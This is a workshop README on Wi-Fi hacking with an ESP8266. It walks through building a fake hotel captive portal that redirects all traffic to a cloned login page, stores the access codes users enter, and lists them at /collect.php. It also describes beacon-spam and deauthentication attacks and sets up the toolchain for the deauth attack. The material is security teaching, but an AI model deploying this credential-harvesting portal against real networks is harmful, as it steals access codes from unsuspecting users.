# Wifi hacking with a 4 dollar microcontroller
This repository contains code and documentation for my workshop 'Wifi hacking with a 4 dollar microcontroller' held on Hacktivity 2016.

## Introduction

The ESP8266 is a wifi enabled microcontroller, which is popular among makers thanks to its low price: the base module costs ~$2 and you can get one with USB connector for $4. In this Workshop I will show you three hacks:
1. **Fake captive portal** - Captive portals are widely used in hotels and other public networks, where the wifi network is open, but upon connection a login page is showed to the user. We will see how to setup a fake captive portal and collect the login credentials. This exercises will show the basic capabilities of the microcontroller. 
2. **Send beacon frames** - These packets are used to introduce wifi networks, so if we send them with random SSID and MAC, whenever someone scans for wifi they will see a lot of new wifi networks, but they will not be able to connect to them. 
3. **Send deauthentication frames** - We will continue with raw packets, and see how to send deauthentication packets to a client to make them drop their connection.

### About ESP8266

The ESP8266 is a low-cost Wi-Fi chip with full TCP/IP stack and MCU (Micro Controller Unit) capability produced by Shanghai-based Chinese manufacturer, [Espressif Systems](https://espressif.com/en). 

Technical details:

* 32-bit RISC CPU: Tensilica Xtensa LX106 running at 80 MHz
* 64 KiB of instruction RAM, 96 KiB of data RAM
* External QSPI flash - 512 KiB to 4 MiB (up to 16 MiB is supported)
* IEEE 802.11 b/g/n Wi-Fi
* Integrated TR switch, balun, LNA, power amplifier and matching network
* WEP or WPA/WPA2 authentication, or open networks
* 16 GPIO pins
* SPI, I²C,
* I²S interfaces with DMA (sharing pins with GPIO)
* UART on dedicated pins, plus a transmit-only UART can be enabled on GPIO2
* 1 10-bit ADC

Source and more info: [Wikipedia](https://en.wikipedia.org/wiki/ESP8266), [Espressif](https://espressif.com/en/products/hardware/esp8266ex/overview).

## Setting up the environment

1. Download the Arduino IDE from [arduino.cc](https://www.arduino.cc/en/Main/Software)
2. Start Arduino IDE, go to File > Preferences and add `http://arduino.esp8266.com/stable/package_esp8266com_index.json` under `Additional board manager`.
3. Go to Tools > Board > Board Manager, search for ESP8266 and install it.
4. Go to Tools > Board and select `Generic ESP8266 module` (if you have the WeMos D1, select `WeMos D1 (retired)`).

### Test the environment setup

To test the setup let's upload two simple example: blink and WifiScan.

#### Blink

1. Go to File > Examples > ESP8266 > Blink
2. Connect ESP8266 to your computer and select the right port under Tools > Port.
3. Click Upload
4. While it compiles (and before upload) press and **hold** the flash button (on the ESP8266) and press reset once, to make the microcontroller enter flash mode. If the upload fails, check the port. If still fails, make sure it enters flash mode. Hold flash and press reset multiple times before it starts to upload. (If you have the WeMos D1 or on other ESP without flash button, you can just simply press Upload and wait. If it fails first, just repeat.)
5. The ESP8266 should blink with its build in led.
6. Bonus: change it to blink faster, try to find an other build in LED (pin definition from the slides might help).

#### WifiScan

1. Go to File > Examples > ESP8266Wifi > WifiScan
2. Upload it as before
3. Go to Tools > Serial Monitor and set the Baudrate to 115200 in the bottom right corner
4. Wait a few seconds and see the nearby Wifi networks listed.
5. Bonus: display other information on the Wifi networks, for example channel. (hint: [ESP8266WiFi.h](https://github.com/esp8266/Arduino/blob/4897e0006b5b0123a2fa31f67b14a3fff65ce561/libraries/ESP8266WiFi/src/ESP8266WiFi.h)).

## Fake captive portal

### The scenario

You are staying in the imaginary Hotel Hacktivity. It has an open wifi `HotelHacktivity` but upon connection you are faced with the following captive portal to enter your access code:

!["Captive portal of Hotel Hacktivity"](https://github.com/markszabo/Hacktivity2016/raw/master/img/hotelhacktivity.png "Captive portal of Hotel Hacktivity")

Every guest receives an access code, but you have lost yours. Can you get someone else's code?

### The code

1. Open Examples > DNSServer > CaptivePortal, and upload it.
2. Connect to the Wifi `DNSServer CaptivePortal example` and go to any http website (eg. [bbc.com](http://www.bbc.com/) or [hotelhacktivity.com](http://www.hotelhacktivity.com/).
3. Change the name of the network in the 18th line: `WiFi.softAP("DNSServer CaptivePortal example");`. In reality we would set it to `HotelHacktivity` but to avoid collusion with others, please set it to something else (eg. add a random number to the end like `HotelHacktivity5943`). Upload & test.
4. Let's add the `login.php`! Open Examples > ESP8266WebServer > HelloServer to see an example.
5. Based on HelloServer add the following lines between webServer.onNotFound and webServer.begin:
    ```
      webServer.on("/login.php", []() {
        webServer.send(200, "text/html", "TODO: implement login form here");
      });
    ```
6. Upload, connect and go to [anysite.com/login.php](http://anysite.com/login.php).
7. Add the actual login page. In real life we would save the html code of the actual login page, now let's use my code. Declare the following new variable outside any function (eg. after `String responseHTML`):
    ```
    String login = ""
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>Login</title>"
    "  <meta charset=\"utf-8\">"
    "  <style>"
    "    body {"
    "      color: #FFFFFF;"
    "      background: rgb(0, 132, 121);"
    "      margin: 0px;"
    "    }"
    "    #header {"
    "      padding: 30px;"
    "      font-size: 40px;"
    "      background: rgb(36, 35, 51);"
    "    }"
    "    #login {"
    "      text-align:center;"
    "      padding: 100px;"
    "      background: rgb(0, 132, 121);"
    "    }"
    "    #submit {"
    "      padding: 10px;"
    "    }"
    "  </style>"
    "</head>"
    "<body>"
    "<div id=\"header\">"
    "  <img src=\""
    "https://hacktivity.com/images/news/170x170/9e13bf40.jpg"
    "\" width=\"60px\" height=\"60px\"> Hotel Hacktivity Wifi Service"
    "</div>"
    "<div id=\"login\">"
    "  <h2>Please enter your access code:</h2>"
    "  <form action=\"login.php\" method=\"get\">"
    "   <div>Access code: <input type=\"text\" name=\"code\" autofocus></div>"
    "   <div id=\"submit\"><input type=\"submit\" value=\"Submit\"></div>"
    "  </form>"
    "</div>"
    "</body>"
    "</html>";

    ```
8. Also change the previously added code to use this variable (replace `"TODO: implement login form here"` with `login`):
```
  webServer.on("/login.php", []() {
    webServer.send(200, "text/html", login);
  });
```
9. Upload and test: go to [anysite.com/login.php](http://anysite.com/login.php) to see the login page, and go to [anysite.com](http://anysite.com/) to see the original captive portal.
10. Instead of the original captive portal, we need it to redirect the visitors to http://www.hotelhacktivity.com/login.php. So let's change webServer.onNotFound into the following:
```
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", String("http://www.hotelhacktivity.com/login.php"), true);
    webServer.send ( 302, "text/plain", "");
  });
```
This will send an http response with code 302 (redirect) and Location set to  `http://www.hotelhacktivity.com/login.php` if any page but /login.php is visited.
11. Upload, test the redirect. If you look closely, the image in the header is not displayed (or if it is, then it's from cache). Fortunately html supports base64 encoded images. To do this download the image, resize and compress it (I used jpg quality 50% in Gimp), and then base64 encode it (either use a website like [b64.io](http://b64.io/) or [base64-image.de](https://www.base64-image.de/) or use this linux command: `cat HacktivityLogoSmall.jpg | base64`. Now you can just use my code, change the `login` string into the following:
```
String login = ""
"<!DOCTYPE html>"
"<html>"
"<head>"
"  <title>Login</title>"
"  <meta charset=\"utf-8\">"
"  <style>"
"    body {"
"      color: #FFFFFF;"
"      background: rgb(0, 132, 121);"
"      margin: 0px;"
"    }"
"    #header {"
"      padding: 30px;"
"      font-size: 40px;"
"      background: rgb(36, 35, 51);"
"    }"
"    #login {"
"      text-align:center;"
"      padding: 100px;"
"      background: rgb(0, 132, 121);"
"    }"
"    #submit {"
"      padding: 10px;"
"    }"
"  </style>"
"</head>"
"<body>"
"<div id=\"header\">"
"  <img src=\""
"data:image/jpeg;base64,"
"/9j/4AAQSkZJRgABAQEASABIAAD/4QecaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hw"
"YWNrZXQgYmVnaW49J++7vycgaWQ9J1c1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCc/Pgo8eDp4bXBt"
"ZXRhIHhtbG5zOng9J2Fkb2JlOm5zOm1ldGEvJz4KPHJkZjpSREYgeG1sbnM6cmRmPSdodHRwOi8v"
"d3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjJz4KCiA8cmRmOkRlc2NyaXB0aW9u"
"IHhtbG5zOmRjPSdodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyc+CiAgPGRjOmZvcm1h"
"dD5pbWFnZS9qcGVnPC9kYzpmb3JtYXQ+CiAgPGRjOnRpdGxlPgogICA8cmRmOkFsdD4KICAgIDxy"
"ZGY6bGkgeG1sOmxhbmc9J3gtZGVmYXVsdCc+eC1kZWZhdWx0PC9yZGY6bGk+CiAgIDwvcmRmOkFs"
"dD4KICA8L2RjOnRpdGxlPgogPC9yZGY6RGVzY3JpcHRpb24+CgogPHJkZjpEZXNjcmlwdGlvbiB4"
"bWxuczp4bXA9J2h0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8nPgogIDx4bXA6TWV0YWRhdGFE"
"YXRlPjIwMTUtMDQtMTZUMjM6Mzg6NDcrMDI6MDA8L3htcDpNZXRhZGF0YURhdGU+CiAgPHhtcDpN"
"b2RpZnlEYXRlPjIwMTUtMDQtMTZUMjE6Mzg6NTdaPC94bXA6TW9kaWZ5RGF0ZT4KICA8eG1wOkNy"
"ZWF0ZURhdGU+MjAxNS0wNC0xNlQyMzozODo0NyswMjowMDwveG1wOkNyZWF0ZURhdGU+CiAgPHht"
"cDpDcmVhdG9yVG9vbD5BZG9iZSBJbGx1c3RyYXRvciBDQyAoTWFjaW50b3NoKTwveG1wOkNyZWF0"
"b3JUb29sPgogPC9yZGY6RGVzY3JpcHRpb24+CgogPHJkZjpEZXNjcmlwdGlvbiB4bWxuczp4bXBN"
"TT0naHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyc+CiAgPHhtcE1NOkluc3RhbmNlSUQ+"
"eG1wLmlpZDphN2ExNWViYi00NTRiLTRiMzUtODU2ZC1hYTZiMjkwYjcyNDU8L3htcE1NOkluc3Rh"
"bmNlSUQ+CiAgPHhtcE1NOkRvY3VtZW50SUQgcmRmOnJlc291cmNlPSd4bXAuZGlkOmE3YTE1ZWJi"
"LTQ1NGItNGIzNS04NTZkLWFhNmIyOTBiNzI0NScgLz4KICA8eG1wTU06T3JpZ2luYWxEb2N1bWVu"
"dElEPnV1aWQ6NUQyMDg5MjQ5M0JGREIxMTkxNEE4NTkwRDMxNTA4Qzg8L3htcE1NOk9yaWdpbmFs"
"RG9jdW1lbnRJRD4KICA8eG1wTU06UmVuZGl0aW9uQ2xhc3M+cHJvb2Y6cGRmPC94bXBNTTpSZW5k"
"aXRpb25DbGFzcz4KICA8eG1wTU06RGVyaXZlZEZyb20gcmRmOnBhcnNlVHlwZT0nUmVzb3VyY2Un"
"CiAgIHhtbG5zOnN0UmVmPSdodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3Vy"
"Y2VSZWYjJz4KICAgPHN0UmVmOmluc3RhbmNlSUQ+eG1wLmlpZDo3NGRmMjU2Mi0zNzQyLTRmODEt"
"ODA0YS02NGYzNmUwYjc0ZmM8L3N0UmVmOmluc3RhbmNlSUQ+CiAgIDxzdFJlZjpkb2N1bWVudElE"
"PnhtcC5kaWQ6NzRkZjI1NjItMzc0Mi00ZjgxLTgwNGEtNjRmMzZlMGI3NGZjPC9zdFJlZjpkb2N1"
"bWVudElEPgogICA8c3RSZWY6b3JpZ2luYWxEb2N1bWVudElEPnV1aWQ6NUQyMDg5MjQ5M0JGREIx"
"MTkxNEE4NTkwRDMxNTA4Qzg8L3N0UmVmOm9yaWdpbmFsRG9jdW1lbnRJRD4KICAgPHN0UmVmOnJl"
"bmRpdGlvbkNsYXNzPnByb29mOnBkZjwvc3RSZWY6cmVuZGl0aW9uQ2xhc3M+CiAgPC94bXBNTTpE"
"ZXJpdmVkRnJvbT4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24geG1sbnM6"
"aWxsdXN0cmF0b3I9J2h0dHA6Ly9ucy5hZG9iZS5jb20vaWxsdXN0cmF0b3IvMS4wLyc+CiAgPGls"
"bHVzdHJhdG9yOlN0YXJ0dXBQcm9maWxlPlByaW50PC9pbGx1c3RyYXRvcjpTdGFydHVwUHJvZmls"
"ZT4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24geG1sbnM6cGRmPSdodHRw"
"Oi8vbnMuYWRvYmUuY29tL3BkZi8xLjMvJz4KICA8cGRmOlByb2R1Y2VyPkFkb2JlIFBERiBsaWJy"
"YXJ5IDkuMDA8L3BkZjpQcm9kdWNlcj4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKPC9yZGY6UkRGPgo8"
"L3g6eG1wbWV0YT4KPD94cGFja2V0IGVuZD0ncic/Pgr/2wBDABALDA4MChAODQ4SERATGCgaGBYW"
"GDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8a"
"Gi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/"
"wgARCAA8ADwDAREAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAgUAAwQBBv/EABQBAQAAAAAA"
"AAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAX4hNYAZkN4wBPCjcAMUD0fnDzZuMRtKjSMwTwo3FA3K"
"TYPzgjLQCwEuGYJ5YuKS0pNo/OCgIM4EXms4QhCEIdP/xAAiEAABBAEEAgMAAAAAAAAAAAACAAED"
"BBMFEBIxFBURITD/2gAIAQEAAQUCXsXVe3mUds5Bgt5l7F1Vs59n6VBUz4DR20zvbzRVaw0i80VW"
"sNIgnYwqTNNs/SobUFWJmi0zvaGwUyrWMqgmKZVrGRQSnMFSfK6fqmXEqCqlxGgqx8Y9M72zE4tP"
"9MRE2UvkCIngdy/L/8QAFBEBAAAAAAAAAAAAAAAAAAAAYP/aAAgBAwEBPwEB/8QAFBEBAAAAAAAA"
"AAAAAAAAAAAAYP/aAAgBAgEBPwEB/8QALBAAAQMBBgQFBQAAAAAAAAAAAgABEQMQEiEiUXIxM0GB"
"BCAjYqEwMjRhwf/aAAgBAQAGPwJcv5RZIutPFGTUsBbVHki608Vy/lFliPJV2qq/t4Kttsqdrfxw"
"RxSYYZcgUfpMMMjJvDjlRRTYI08lXbZV2qs2rKp2tJmohg0o8gtDdEUUgwR+mI3W6InGiGCPIwxp"
"ae1Vdqqv7VV2qq2rfx1U7W8tr0DGCJ2uDllh1wQ4A0lEXeCi6OZ4bD9oPtzT0TyzNDxh9L//xAAm"
"EAABAwMDAwUBAAAAAAAAAAABABEhEDFBYXHwUbHBIIGh0eGR/9oACAEBAAE/ITAWlUnlQQykolTe"
"QBaVSG63y9LlL0nvA9gmfqt4G9DYrifiN3HxlBpozr+KDyuMqNtuZH0j1sN1LlL6NiyB6fwVwN6G"
"xRhyLHLK+pByHA56os8h1LojHUowhhd1LiOxyxXpHtVWLljF8nhcDehsUIQJZKS7n+BOw48CbnNk"
"UgQ7J3dx0BiEi10N7dlCQiXad0GPHFci59DD1f/aAAwDAQACAAMAAAAQAggAkAEAEkAgkEAAEkEA"
"kAkAEgEgkEkg/8QAFBEBAAAAAAAAAAAAAAAAAAAAYP/aAAgBAwEBPxAB/8QAFBEBAAAAAAAAAAAA"
"AAAAAAAAYP/aAAgBAgEBPxAB/8QAJRABAAIBAgUFAQEAAAAAAAAAAQARITFREEFhgaFxkcHR8LHx"
"/9oACAEBAAE/EFY7Fz8T6iJRyK3o0lpFd4q602GEJHLrc2NOk/E+oChUsZrvobcPBZZvPKfM0J+D"
"Loos7jvHZ+Ocs3nj8B01XRP9AgEyRudrggkAosBTBmqzc34cEr0yuATN55sQSptlDlfQ24eC8PKf"
"MNCfi9YaNtZ2bf6B3nj8B02tEstQMYWyjvmALypexl0ud4CtDwygoYI6sPtLZ0AbrTx7X4jNf3K/"
"rh4LLI4zLqlQP6xXm5vmM+tYvel+JT8t5pKHGdHI9Y8fgOmORLw/o1rVA3VqGu8ugmtvsuZYIiBz"
"RSzL4FKXuoHbDua4v0M3Lznn7oGi4DNLgp3E2L6LSegt0dONG06BKNpRtKNuP//Z"
"\" width=\"60px\" height=\"60px\"> Hotel Hacktivity Wifi Service"
"</div>"
"<div id=\"login\">"
"  <h2>Please enter your access code:</h2>"
"  <form action=\"login.php\" method=\"get\">"
"   <div>Access code: <input type=\"text\" name=\"code\" autofocus></div>"
"   <div id=\"submit\"><input type=\"submit\" value=\"Submit\"></div>"
"  </form>"
"</div>"
"</body>"
"</html>";
``` 
12. Upload and test.
13. It should look good, but one functionality is still missing: the entered access codes are not saved. Let's change the form action to login2.php (in the `login` string change the `<form action=\"login.php\" method=\"get\">` line to `<form action=\"login2.php\" method=\"get\">`. Declare a new variable before `setup()` with `String sniffed = "";` and add the following code after `webServer.on("/login.php", [](){...});` to handle the requests to login2.php:
```
  webServer.on("/login2.php", []() {
    if(webServer.args() > 0 && webServer.argName(0) == "code") {
      sniffed += webServer.arg(0) + "\n";
      }
    webServer.send(200, "text/plain", "Error - unknown error occured, please try again later.");
  });
```
If login2.php is queried with at least one argument and the name of the first argument is code, then it will save the value of that argument to the variable `sniffed`. Then we display an error to the user. As you can see we can access the number of GET/POST parameters by `webServer.args()`, the name of the ith parameter by `webServer.argName(i)` and its value as `webServer.arg(i)`.
14. Upload and test to see the error message upon entering any code.
15. There is one final step missing: we need to get the access codes entered by others. To do this add the following lines after `webServer.on("/login2.php", [](){...});`:
```
  webServer.on("/collect.php", []() {
    webServer.send(200, "text/plain", sniffed);
  });
```
Now if we go to /collect.php, it will display all the collected access codes. Upload and check it.
16. Bonus: if the ESP8266 restarts, all the previously recorded access codes are gone. Implement some permanent storage for the codes! (Hint: use [EEPROM](https://github.com/esp8266/Arduino/tree/master/libraries/EEPROM) or [ESP8266's filesystem](https://github.com/esp8266/Arduino/blob/master/doc/filesystem.md).

Deauth attack environment
Download arduino 1.6.5 from link
Enter arduino's directory, then cd hardware.
mkdir esp8266com
cd esp8266com
git clone https://github.com/esp8266/Arduino.git esp8266
cd esp8266
git checkout 5653b9a59baa25094c891d030214aa956bec452c (the last version with sdk 1.3)
cd tools
python get.py

